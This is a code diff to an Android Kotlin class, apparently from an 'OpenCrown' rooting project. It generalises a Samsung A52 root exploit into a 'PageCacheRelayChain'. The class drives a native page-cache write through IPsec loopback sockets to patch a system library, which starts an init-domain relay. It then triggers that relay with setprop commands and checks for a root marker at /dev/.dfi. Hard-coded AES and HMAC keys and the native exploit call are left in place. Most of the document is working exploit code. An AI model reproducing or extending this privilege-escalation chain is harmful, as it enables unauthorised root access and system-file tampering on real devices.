@@ -12,14 +12,13 @@ import java.net.InetAddress
 import java.util.concurrent.TimeUnit
 
 /**
- * A52s page-cache chain.
+ * Generic page-cache relay chain.
  *
- * The chain stages a libbase page-cache patch and builds an init-domain relay.
- * The app cannot connect to that relay (untrusted_app is excluded by SELinux),
- * but the relay creates /dev/.dfi when it starts. The app only needs to know
- * whether root is active, so it looks for the marker.
+ * The payload and its supported device/kernel specification come from the
+ * payload manifest. This class only performs the IPsec/page-cache write and
+ * checks the init relay marker.
  */
-class A52RootChain(private val context: Context) {
+class PageCacheRelayChain(private val context: Context) {
     interface Listener {
         fun onLog(line: String)
     }
@@ -41,8 +40,7 @@ class A52RootChain(private val context: Context) {
     @Volatile
     private var listener: Listener? = null
 
-    /** Run the page-cache exploit. Returns true when the native chain reports success. */
-    fun run(listener: Listener): Boolean {
+    fun run(payload: ByteArray, listener: Listener): Boolean {
         this.listener = listener
         synchronized(RUN_LOCK) {
             var ipsec: IpSecManager? = null
@@ -50,9 +48,7 @@ class A52RootChain(private val context: Context) {
             var encap: IpSecManager.UdpEncapsulationSocket? = null
             var transform: IpSecTransform? = null
             return try {
-                val payload = context.assets.open(PAYLOAD_ASSET).use { it.readBytes() }
-                require(payload.size == 576) { "unexpected payload size ${payload.size}" }
-
+                require(payload.size >= 16) { "empty payload" }
                 ipsec = context.getSystemService(Context.IPSEC_SERVICE) as? IpSecManager
                     ?: error("IpSecManager unavailable")
                 val loopback = InetAddress.getByName("127.0.0.1")
@@ -72,10 +68,10 @@ class A52RootChain(private val context: Context) {
                 System.arraycopy(HMAC_SHA256_KEY, 0, keys, 32, 32)
                 val result = nativeExploit(port, spi.spi, payload, keys, HMAC_TRUNC_BITS / 8, this)
                 listener.onLog(result ?: "native exploit returned no result")
-                result?.contains("Verified: 576/576 bytes match") == true &&
+                result?.contains("Verified:") == true &&
                     result?.contains("PAGE CACHE MODIFIED") == true
             } catch (t: Throwable) {
-                Log.e(TAG, "A52 root exploit failed", t)
+                Log.e(TAG, "page-cache relay failed", t)
                 listener.onLog("exploit failed: ${t.javaClass.simpleName}: ${t.message}")
                 false
             } finally {
@@ -86,12 +82,12 @@ class A52RootChain(private val context: Context) {
         }
     }
 
-    /** Ask init to log, which is how the patched logger starts the relay. */
     fun triggerInitLog(): String {
         val token = System.currentTimeMillis().toString()
         val attempts = listOf(
+            arrayOf("/system/bin/setprop", "ctl.start", "zzz"),
             arrayOf("/system/bin/setprop", "debug.dirtyinit", token),
-            arrayOf("/system/bin/sh", "-c", "setprop debug.dirtyinit $token"),
+            arrayOf("/system/bin/sh", "-c", "setprop ctl.start zzz"),
         )
         for (cmd in attempts) {
             try {
@@ -99,9 +95,7 @@ class A52RootChain(private val context: Context) {
                 val finished = process.waitFor(2, TimeUnit.SECONDS)
                 val output = process.inputStream.bufferedReader().readText().trim()
                 if (!finished) process.destroyForcibly()
-                if (finished && process.exitValue() == 0) {
-                    return "init trigger accepted"
-                }
+                if (finished && process.exitValue() == 0) return "init trigger accepted"
                 if (output.isNotEmpty()) return output
             } catch (t: Throwable) {
                 Log.w(TAG, "trigger attempt failed", t)
@@ -110,10 +104,6 @@ class A52RootChain(private val context: Context) {
         return "init trigger denied"
     }
 
-    /**
-     * The relay creates /dev/.dfi. The app cannot open it (untrusted_app), but
-     * EACCES/EPERM on stat means the marker exists. ENOENT means no relay yet.
-     */
     fun isRootActive(): Boolean {
         return try {
             Os.stat("/dev/.dfi")
@@ -124,16 +114,14 @@ class A52RootChain(private val context: Context) {
     }
 
     companion object {
-        private const val TAG = "OpenCrownA52"
-        private const val PAYLOAD_ASSET = "a52_payload.bin"
+        private const val TAG = "OpenCrownRelay"
         private const val HMAC_TRUNC_BITS = 128
-
         private val AES_CBC_KEY = "ABCDEFGHIJKLMNOPQRSTUVWXYZ012345".toByteArray(Charsets.US_ASCII)
         private val HMAC_SHA256_KEY = "HMACKEY_FOR_DIRTYINIT_CBC_MODE!!".toByteArray(Charsets.US_ASCII)
         private val RUN_LOCK = Any()
 
         init {
-            System.loadLibrary("a52root")
+            System.loadLibrary("pagecache_relay")
         }
     }
 }
